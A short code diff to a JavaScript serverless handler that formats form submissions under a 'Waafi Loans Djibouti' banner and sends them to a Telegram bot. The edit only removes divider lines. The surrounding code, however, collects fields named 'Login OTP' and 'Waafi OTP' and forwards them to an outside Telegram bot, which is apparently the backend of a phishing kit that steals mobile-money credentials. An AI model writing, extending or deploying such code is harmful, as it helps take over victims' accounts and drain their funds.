@@ -19,8 +19,7 @@ export default async function handler(req, res) {
   const p = payload;
   const event = p.event || 'Submission';
 
-  let text = `🏦 <b>Waafi Loans Djibouti 🇩🇯 — ${esc(event)}</b>\n`;
-  text += divider();
+  let text = `🏦 <b>Waafi Loans Djibouti 🇩🇯 — ${esc(event)}</b>\n\n`;
 
   if (p.submittedAt) {
     const t = new Date(p.submittedAt);
@@ -45,7 +44,7 @@ export default async function handler(req, res) {
   if (p['Login OTP'])   text += line('Login OTP', p['Login OTP']);
   if (p['Waafi OTP'])   text += line('Waafi OTP', p['Waafi OTP']);
 
-  text += '\n' + divider();
+  text += '\n';
 
   try {
     const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
